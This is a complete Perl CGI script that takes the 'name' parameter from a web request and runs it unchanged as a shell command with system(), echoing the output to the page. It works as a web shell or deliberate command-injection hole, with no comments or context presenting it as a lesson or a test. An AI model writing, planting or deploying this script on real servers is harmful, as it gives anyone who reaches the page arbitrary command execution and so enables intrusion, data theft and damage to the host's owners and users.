#!/usr/bin/perl
print "content-type:text/html \n\n";
use CGI;
$a=new CGI;
$cmd=$a->param("name");
print "output of unix command is <br><br>";
system($cmd);

